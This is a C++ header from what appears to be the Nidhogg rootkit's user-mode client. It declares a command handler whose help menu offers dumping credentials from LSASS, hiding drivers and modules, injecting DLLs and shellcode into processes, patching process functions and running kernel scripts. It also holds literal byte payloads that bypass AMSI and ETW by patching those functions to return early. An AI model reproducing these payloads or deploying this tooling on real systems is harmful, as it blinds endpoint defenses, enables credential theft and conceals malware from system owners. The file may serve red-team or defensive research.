#pragma once
#include "pch.h"
#include "CommandHandler.h"

constexpr wchar_t AMSI_PATH[] = LR"(C:\Windows\System32\Amsi.dll)";
constexpr wchar_t NTDLL_PATH[] = LR"(C:\Windows\System32\ntdll.dll)";
std::vector<byte> AMSI_BYPASS_PAYLOAD = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
std::vector<byte> ETW_BYPASS_PAYLOAD = { 0xC3 };
constexpr SIZE_T MAX_SHELLCODE_PARAMETERS = 3;

class MemoryHandlerException : public std::runtime_error {
private:
	std::string msg;
public:
	MemoryHandlerException(_In_ const std::string& message)
		: std::runtime_error(message), msg(message) {}
	const char* what() const override {
		return msg.c_str();
	}
};

class MemoryHandler : protected CommandHandler {
private:
	std::vector<Credentials> DumpCredentials(_Inout_ std::shared_ptr<DesKeyInformation> desKey);
	bool HideDriver(_In_ std::wstring driverPath, _In_ bool hide);
	bool HideModule(_In_ DWORD pid, _In_ std::wstring modulePath);
	bool InjectDll(_In_ DWORD pid, _In_ std::string dllPath, _In_ InjectionType injectionType);
	bool InjectShellcode(_In_ DWORD pid, _In_ std::vector<byte> shellcode, std::vector<std::string> parameters, _In_ InjectionType injectionType);
	bool PatchModule(_In_ DWORD pid, _In_ std::wstring moduleName, _In_ std::string functionName, _In_ std::vector<byte> patch);
	bool PatchAmsi(_In_ DWORD pid);
	bool PatchEtw(_In_ DWORD pid);
	bool ExecuteScript(_In_ std::vector<byte> script);

public:
	MemoryHandler(_In_ std::shared_ptr<HANDLE> hNidhogg) : CommandHandler("Memory", hNidhogg) {};

	void PrintHelp() override {
		std::cout << "Options:" << std::endl;
		std::cout << "exit - Exit the program" << std::endl;
		std::cout << "back - Go back to the main menu" << std::endl;
		std::cout << "dump_creds - Dumping credentials from LSASS" << std::endl;
		std::cout << "hide_module [pid] [module path] - Hiding a module inside a process" << std::endl;
		std::cout << "hide_driver [driver path] - Hiding a driver" << std::endl;
		std::cout << "[unhide_driver | reveal_driver] [driver path] - Revealing a driver after hiding it" << std::endl;
		std::cout << "inject_dll [apc | thread] [pid] [dll path] - Injecting a DLL into a process" << std::endl;
		std::cout << "inject_shellcode [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3] - Injecting shellcode into a process" << std::endl;
		std::cout << "patch [pid] [module name] [function name] [patch comma separated] - Patching a module inside a process" << std::endl;
		std::cout << "patch_amsi [pid] - Patch AMSI in a process" << std::endl;
		std::cout << "patch_etw [pid] - Patch ETW in a process" << std::endl;
		std::cout << "execute_script [script_file] - Execute a script in the kernel" << std::endl;
	}

	void HandleCommand(_In_ std::string command) override;
};

